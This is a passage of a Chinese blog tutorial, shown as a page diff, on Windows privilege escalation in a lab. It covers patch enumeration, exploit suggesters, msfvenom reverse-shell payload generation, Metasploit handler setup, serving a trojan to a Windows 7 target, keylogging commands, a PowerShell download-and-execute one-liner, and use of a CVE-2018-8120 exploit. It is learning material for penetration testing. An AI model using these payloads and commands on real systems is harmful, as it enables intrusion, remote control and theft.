data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
 
 
 
 
-<main class="post-container content">
 
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-09-19T13:06:56.871Z">2023-09-19</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-09-25T11:22:54.312Z">2023-09-25</time></span></div></div></div>
     
-    <div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/tags/Windows-%E6%8F%90%E6%9D%83/">
-                                <span class="chip bg-color">Windows 提权</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                内网渗透
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-09-19
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-09-25
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.8k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    25 分
-                </div>
-                
-
-                
-            </div>
-        </div>
-        <hr class="clearfix">
-
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Windows提权学习一</span></h1>
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.css">
-        
-
-        
-
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h2 id="0x01-基础知识">0x01 基础知识</h2>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content slide-up"><h2 id="0x01-基础知识">0x01 基础知识</h2>
 <blockquote>
 <p>提权的思路最重要的就是信息收集,我们只有对整个系统进行了较全面的信息收集,大概对整个系统有了一定的了解后,我们才能高效且精准的完成提权</p>
 <p>比方说:我们收集到这个系统是windows-sever2003的系统和里面的一些相关配置我们能联想到什么提权方法呢?</p>
 <p>是不是可以先利用自动化工具(msf和cs)先去尝试–&gt;针对低版本的系统命令–&gt;进程迁移–&gt;令牌窃取–&gt;dll劫持–&gt;不安全的服务–&gt;手工提权这么一个流程</p>
 </blockquote>
-<h3 id="1-1-提权基础命令">1.1 提权基础命令</h3>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查询系统信息</span>
+<h3 id="11-提权基础命令">1.1 提权基础命令</h3>
+<pre><code class="hljs bash"><span class="hljs-comment"># 查询系统信息</span>
 systeminfo 
-<span class="token comment"># 如果要查看特定的信息，可以使用</span>
-systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS名称"</span> /C:<span class="token string">"OS版本"</span>
-<span class="token comment"># 主机名</span>
+<span class="hljs-comment"># 如果要查看特定的信息，可以使用</span>
+systeminfo | findstr /B /C:<span class="hljs-string">"OS名称"</span> /C:<span class="hljs-string">"OS版本"</span>
+<span class="hljs-comment"># 主机名</span>
 Hostname
-<span class="token comment"># 环境变量</span>
+<span class="hljs-comment"># 环境变量</span>
 Set
-<span class="token comment"># 查看用户信息</span>
+<span class="hljs-comment"># 查看用户信息</span>
 Net user
-<span class="token comment"># 查看服务 pid 号</span>
-tasklist /svc<span class="token operator">|</span><span class="token function">find</span> <span class="token string">"TermService"</span>
-<span class="token function">netstat</span> -ano<span class="token operator">|</span><span class="token function">find</span> <span class="token string">"3389"</span>
-<span class="token comment"># 查看系统名</span>
+<span class="hljs-comment"># 查看服务 pid 号</span>
+tasklist /svc|find <span class="hljs-string">"TermService"</span>
+netstat -ano|find <span class="hljs-string">"3389"</span>
+<span class="hljs-comment"># 查看系统名</span>
 wmic os get caption
-<span class="token comment"># 查看补丁信息</span>
+<span class="hljs-comment"># 查看补丁信息</span>
 wmic qfe get Description,HotFixID,InstalledOn
-<span class="token comment"># 如果要定位到特定的补丁可以使用如下命令</span>
-wmic qfe get Description,HotFixID,InstalledOn <span class="token operator">|</span> findstr /C:<span class="token string">"KB4346084"</span> /C:<span class="token string">"KB4509094"</span>
-<span class="token comment"># 查看当前安装程序</span>
-wmic product get name,version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="hljs-comment"># 如果要定位到特定的补丁可以使用如下命令</span>
+wmic qfe get Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">"KB4346084"</span> /C:<span class="hljs-string">"KB4509094"</span>
+<span class="hljs-comment"># 查看当前安装程序</span>
+wmic product get name,version</code></pre>
 <p>其中需要注意一下 <code>环境变量</code>，因为有的软件环境变量可能设置在其它路径中，而在该路径下的文件是具有写权限的，就可以通过<strong>替换文件</strong>来达到提权操作</p>
 <p>这里的命令在windows信息搜集都有的</p>
-<h3 id="1-2-Windows-权限划分">1.2 Windows 权限划分</h3>
+<h3 id="12-windows-权限划分">1.2 Windows 权限划分</h3>
 <ul>
 <li>User：普通用户权限，系统中最安全的权限，分配给该组的默认权限不允许成员修改操作系统的设置或用户资料</li>
 <li>Administrator：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，以便操作 SAM 文件等</li>
 <li>System：系统权限，可以对 SAM 等敏感文件进行读取，往往需要 Administrator 权限提升到 System 权限才可以对散列值进行 Dump 操作</li>
 <li>TrustedInstaller：最高权限， 对于系统文件，即使 System 权限也无法进行修改，只有 TrustedInstaller 权限才可以修改文件</li>
 </ul>
-<h3 id="1-3-常见-webshell-所处的权限">1.3 常见 webshell 所处的权限</h3>
+<h3 id="13-常见-webshell-所处的权限">1.3 常见 webshell 所处的权限</h3>
 <p>通常的 webshell 权限如下：</p>
 <ul>
 <li>ASP、PHP - 匿名权限</li>
 <li>ASPX - user 权限</li>
 <li>JSP - 通常是系统权限</li>
 </ul>
-<h3 id="1-4-权限提升分类">1.4 权限提升分类</h3>
+<h3 id="14-权限提升分类">1.4 权限提升分类</h3>
 <ul>
 <li>纵向提权：低权限用户获得高权限角色的权限。</li>
 <li>横向提权：获得同级别角色的权限。</li>
@@ -496,94 +197,94 @@ wmic product get name,version<span aria-hidden="true" class="line-numbers-rows">
 <p>​		溢出漏洞是一种计算机程序的可更正性缺陷。溢出漏洞的全名：缓冲区溢出漏洞。因为它是在程序执行的时候在缓冲区执行的错误代码，所以叫缓冲区溢出漏洞。缓冲溢出是最常见的内存错误之一，也是攻击者入侵系统时所用到的最强大、最经典的一类漏洞利用方式。成功地利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。</p>
 <p>​		利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。</p>
 <p>下面演示提权过程。</p>
-<h3 id="2-1-手动查找系统潜在漏洞">2.1 手动查找系统潜在漏洞</h3>
+<h3 id="21-手动查找系统潜在漏洞">2.1 手动查找系统潜在漏洞</h3>
 <p>获取目标主机的一个普通用户的shell后，执行如下命令，查看目标系统上安装了那些补丁：</p>
-<pre class="line-numbers language-none"><code class="language-none">systeminfo
+<pre><code class="hljs plaintext">systeminfo
 或
-wmic qfe get caption,description,hotfixid,installedon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="image-20230919220245012-1695132165630-1.png" alt="image-20230919220245012"></p>
-<p><img src="image-20230919220312677.png" alt="image-20230919220312677"></p>
+wmic qfe get caption,description,hotfixid,installedon</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230919220245012-1695132165630-1.png" alt="image-20230919220245012"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230919220312677.png" alt="image-20230919220312677"></p>
 <p>可以看到系统就装了这几个补丁。攻击者会通过没有列出的补丁号，寻找相应的提权EXP，例如KiTrap0D和KB979682对应、MS10-021和KB979683对应等等。然后使用目标机上没有的安装的补丁号对应的EXP进行提权。Windows不同系统提权的漏洞和相应的补丁请见：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8">点我呀</a>。</p>
-<h3 id="2-2-自动查找系统潜在漏洞">2.2 自动查找系统潜在漏洞</h3>
-<h4 id="方法一：Windows-Exploit-Suggester"><strong>方法一：Windows Exploit Suggester</strong></h4>
+<h3 id="22-自动查找系统潜在漏洞">2.2 自动查找系统潜在漏洞</h3>
+<h4 id="方法一windows-exploit-suggester"><strong>方法一：Windows Exploit Suggester</strong></h4>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
 <p>该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而且其只需要我们给出目标系统的信息即可。</p>
 <p>使用如下：</p>
 <p>首先更新漏洞数据库，会生成一个xls的文件，如下 2023-09-20-mssb.xls</p>
 <p>这里有个小问题，首先下载好zip更新了数据库之后，需要安装一个依赖，依赖项目中有说明，之后更新数据库按理来说，更新的文件后缀应为xls，可我这里是xlsx，如果直接用xlsx则会报错（以上是我在虚拟机的情况），我们可以在本地更新后打开另存为xls，具体呢推荐如下图所示的格式</p>
-<p><img src="image-20230921161056911.png" alt="image-20230921161056911"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921161056911.png" alt="image-20230921161056911"></p>
 <p>其他形式还未尝试，大家感兴趣可以测试</p>
 <p>注意必须为python2环境</p>
-<p><img src="image-20230920214726283.png" alt="image-20230920214726283"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230920214726283.png" alt="image-20230920214726283"></p>
 <p>然后执行如下命令，查看目标主机系统信息，保存为sysinfo.txt文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; sysinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">systeminfo &gt; sysinfo.txt</code></pre>
 <p>最后，运行如下命令，查看该系统是否存在可利用的提权漏洞：</p>
-<pre class="line-numbers language-none"><code class="language-none">python2 windows-exploit-suggester.py -d 2020-08-20-mssb.xls -i sysinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230921183511118.png" alt="image-20230921183511118"></p>
+<pre><code class="hljs plaintext">python2 windows-exploit-suggester.py -d 2020-08-20-mssb.xls -i sysinfo.txt</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921183511118.png" alt="image-20230921183511118"></p>
 <p>如上图，执行后，给出了一些目标系统存在的漏洞</p>
-<h4 id="方法二：local-exploit-suggester-模块"><strong>方法二：local_exploit_suggester 模块</strong></h4>
+<h4 id="方法二local_exploit_suggester-模块"><strong>方法二：local_exploit_suggester 模块</strong></h4>
 <p>Metasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。</p>
 <p>使用如下，假设我们已经获得了目标主机的一个session：</p>
-<pre class="line-numbers language-none"><code class="language-none">use post/multi/recon/local_exploit_suggester 
+<pre><code class="hljs plaintext">use post/multi/recon/local_exploit_suggester 
 set session 1
-exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+exploit</code></pre>
 <p>这里我就搜了篇文章，对win7靶机获取一下其session</p>
-<h5 id="小tip：后渗透之获取普通session">小tip：后渗透之获取普通session</h5>
-<pre class="line-numbers language-none"><code class="language-none">所需环境：1.kali Linux（攻击机） 2.windows7（靶机）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">在kali终端中打开msfconsole控制台
+<h5 id="小tip后渗透之获取普通session">小tip：后渗透之获取普通session</h5>
+<pre><code class="hljs plaintext">所需环境：1.kali Linux（攻击机） 2.windows7（靶机）</code></pre>
+<pre><code class="hljs plaintext">在kali终端中打开msfconsole控制台
 开启监听
 use exploit/multi/handler
 设置tcp监听
-set payload windows/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="image-20230921202649678.png" alt="image-20230921202649678"></p>
+set payload windows/meterpreter/reverse_tcp</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921202649678.png" alt="image-20230921202649678"></p>
 <p><strong>Linux：</strong><br>
 <code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf &gt; shell.elf</code></p>
 <p><strong>Windows:</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">32 位：msfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f exe &gt; shell.exe
+<pre><code class="hljs plaintext">32 位：msfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f exe &gt; shell.exe
 
-64 位：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.17.128 lport=4444 -a x64 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">说明：-p payload(有效载荷) 通俗的讲payload是用来建立目标机与攻击机稳定连接的，可以返回shell
+64 位：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.17.128 lport=4444 -a x64 -f exe &gt; shell.exe</code></pre>
+<pre><code class="hljs plaintext">说明：-p payload(有效载荷) 通俗的讲payload是用来建立目标机与攻击机稳定连接的，可以返回shell
 -e 编码方式
 -i 编码次数
 -b 在生成的程序中避免出现的值
--f exe 生成exe格式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.17.137 lport=4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+-f exe 生成exe格式</code></pre>
+<pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.17.137 lport=4444 -f exe &gt; shell.exe</code></pre>
 <p>不过操作下来，发现没必要非得写64位对应的命令，反而这个命令还报错，不知是否为我的失误</p>
-<p><img src="image-20230921203114154.png" alt="image-20230921203114154"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921203114154.png" alt="image-20230921203114154"></p>
 <p>4.将该shell文件上传到靶机中。在kali控制台下使用python 环境执行命令：python -m SimpleHTTPServer 800搭建一个http服务，提供一个web页面供靶机浏览。(一定是在管理员模式下执行此命令 (sudo su))</p>
 <p>不过这里不用搞800,默认端口即可</p>
-<p><img src="image-20230921203048925.png" alt="image-20230921203048925"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921203048925.png" alt="image-20230921203048925"></p>
 <p>值得注意的是python2才可以</p>
 <p>打开目标机win7，输入地址进行下载木马并保存在桌面</p>
-<p><img src="image-20230921203210416.png" alt="image-20230921203210416"></p>
-<p><img src="image-20230921203245580-1695299566148-5.png" alt="image-20230921203245580"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921203210416.png" alt="image-20230921203210416"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921203245580-1695299566148-5.png" alt="image-20230921203245580"></p>
 <p>上图为下载的回显，返回第二步界面，设置监听主机，运行</p>
-<p><img src="image-20230921203352142-1695299632698-7.png" alt="image-20230921203352142"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921203352142-1695299632698-7.png" alt="image-20230921203352142"></p>
 <p>可以看到得到了session</p>
 <p>​		查看session，如果此时是meterpreter，输入background即可返回msf exploit(multi/handler)<br>
 <code>查看系统信息:sysinfo</code><br>
 <code>截取时下桌面:screenshot</code></p>
-<p><img src="image-20230921203447168.png" alt="image-20230921203447168"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921203447168.png" alt="image-20230921203447168"></p>
 <p>捕获击键记录:keyscan start<br>
 控制键盘鼠标 启用/禁用:uictl enable/disable keyboard</p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44286136/article/details/115865976">msf 获取一个普通的session 控制windows</a></p>
 <p>接上回，我们已经获得了目标主机的一个session：</p>
-<pre class="line-numbers language-none"><code class="language-none">use post/multi/recon/local_exploit_suggester 
+<pre><code class="hljs plaintext">use post/multi/recon/local_exploit_suggester 
 set session 1
-exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+exploit</code></pre>
 <p>这里也有个小坑，必须要在同一终端下，将msf先挂个后台，通过background，随后在执行上述命令</p>
-<p><img src="image-20230921204604770-1695300365102-9.png" alt="image-20230921204604770"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921204604770-1695300365102-9.png" alt="image-20230921204604770"></p>
 <p>这里也是发现了二十几个，该模块快速识别并列出了系统中可能被利用的漏洞，十分方便。但虽然如此，也并非所有列出的local exploits都可用。</p>
-<h4 id="方法三：enum-patches-模块">方法三：enum_patches 模块</h4>
+<h4 id="方法三enum_patches-模块">方法三：enum_patches 模块</h4>
 <p>会用metasploit中的post/windows/gather/enum_patches模块可以根据漏洞编号快速找出系统中缺少的补丁。使用如下：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use post/windows/gather/enum_patches
-<span class="token builtin class-name">set</span> session <span class="token number">1</span>
-exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre><code class="hljs shell">use post/windows/gather/enum_patches
+set session 1
+exploit</code></pre>
 <p>这里不在演示了，同上述步骤即可</p>
 <p>在实际的查找潜在漏洞的过程中，建议手动和自动双管齐下。</p>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
 <p>该脚本可以快速的查找出可能用于本地权限提升的漏洞。使用如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ip/Sherlock.ps1');      // 远程执行
+<pre><code class="hljs plaintext">powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ip/Sherlock.ps1');      // 远程执行
 
 #导入模块
 Import-Module .\Sherlock.ps1
@@ -592,10 +293,10 @@ Set-ExecutionPolicy Unrestricted
 #输入如下命令可以查看帮助信息
 powercat -h
 
-Find-AllVulns    // 调用脚本后，执行搜索命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Find-AllVulns    // 调用脚本后，执行搜索命令</code></pre>
 <p>这里总是报错，我就下载到本地了，这里搜索的时间较长，耐心等待</p>
-<p><img src="image-20230921210646280-1695301606818-11.png" alt="image-20230921210646280"></p>
-<h3 id="2-3-选择漏洞并利用">2.3 选择漏洞并利用</h3>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921210646280-1695301606818-11.png" alt="image-20230921210646280"></p>
+<h3 id="23-选择漏洞并利用">2.3 选择漏洞并利用</h3>
 <p>查找了目标机器上的补丁并确定存在漏洞后，我们就可以像目标机器上传本地溢出程序，并执行。这里，我们选择的是CVE-2018-8120。</p>
 <p>漏洞利用程序可以从以下几个地址中下载：（里面附有使用说明）</p>
 <ul>
@@ -603,31 +304,31 @@ Find-AllVulns    // 调用脚本后，执行搜索命令<span aria-hidden="true"
 <li>Windows内核溢出漏洞提权大全：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
 <li>各大平台提权工具：<a target="_blank" rel="noopener" href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></li>
 </ul>
-<p><img src="image-20230921213244700.png" alt="image-20230921213244700"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921213244700.png" alt="image-20230921213244700"></p>
 <p>这里下载的时候注意将exe文件放入相应目录在执行如上命令</p>
-<p><img src="image-20230921212009290.png" alt="image-20230921212009290"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921212009290.png" alt="image-20230921212009290"></p>
 <p>如上图，再执行提权程序之前，为普通用户whoami权限，执行后为system权限。msfconsole上完整操作如下：</p>
-<p><img src="image-20230921215222058.png" alt="image-20230921215222058"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921215222058.png" alt="image-20230921215222058"></p>
 <p>这里尝试了多个漏洞，但似乎是我的用法不正确（而且我也不知道如何用）导致在此环境下whoami一直为普通用户</p>
-<p><img src="image-20230921215307071.png" alt="image-20230921215307071"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921215307071.png" alt="image-20230921215307071"></p>
 <p>但奇怪的是每次执行命令之后，靶机都会自动跳转一个以管理员身份打开的cmd</p>
 <p>但可能为另一种情况，就是其目标就是让靶机提权，但或许反应不到msf上，这里我对内网渗透了解较少，可能理解有问题吧，先过个思路。</p>
-<p><img src="image-20230921220546766.png" alt="image-20230921220546766"></p>
